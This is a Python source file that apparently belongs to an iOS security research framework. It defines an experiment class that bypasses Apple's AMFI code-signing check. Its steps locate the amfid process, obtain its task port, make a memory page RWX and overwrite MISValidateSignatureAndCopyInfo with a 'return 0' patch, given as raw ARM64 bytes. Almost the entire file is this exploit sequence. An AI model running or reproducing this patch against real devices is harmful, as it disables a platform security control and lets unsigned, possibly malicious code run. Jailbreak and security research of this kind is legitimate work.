"""
Experiment: AMFI bypass via mprotect + direct memory patch.

Strategy:
1. Find amfid in kernel proc list
2. Get amfid task port via task_for_pid
3. mprotect target region to RWX
4. Direct write patch to MISValidateSignature
"""

from typing import List
from src.research.experiment_base import ExperimentBase
from src.core.research_console import ResearchStep


class ExpAmfidMprotect(ExperimentBase):
    @property
    def name(self) -> str:
        return "amfid_mprotect"

    @property
    def description(self) -> str:
        return "Bypass AMFI via mprotect RWX + direct memory write"

    def build_steps(self) -> List[ResearchStep]:
        return [
            ResearchStep(
                name="Find amfid proc struct",
                command="FIND_PROC_BY_NAME:amfid",
                timeout=5.0,
            ),
            ResearchStep(
                name="Get amfid task port",
                command="GET_TASK_PORT:amfid",
                timeout=5.0,
            ),
            ResearchStep(
                name="Find MISValidateSignature address",
                command="FIND_SYMBOL:amfid:MISValidateSignatureAndCopyInfo",
                timeout=5.0,
            ),
            ResearchStep(
                name="mprotect target page RWX",
                command="TASK_MPROTECT:amfid:$TARGET_PAGE:0x4000:7",
                timeout=5.0,
            ),
            ResearchStep(
                name="Write patch (mov x0, #0; ret)",
                command="TASK_WRITE:amfid:$TARGET_ADDR:d2800000d65f03c0",
                timeout=5.0,
            ),
            ResearchStep(
                name="Verify patch",
                command="TASK_READ:amfid:$TARGET_ADDR:8",
                timeout=5.0,
            ),
        ]
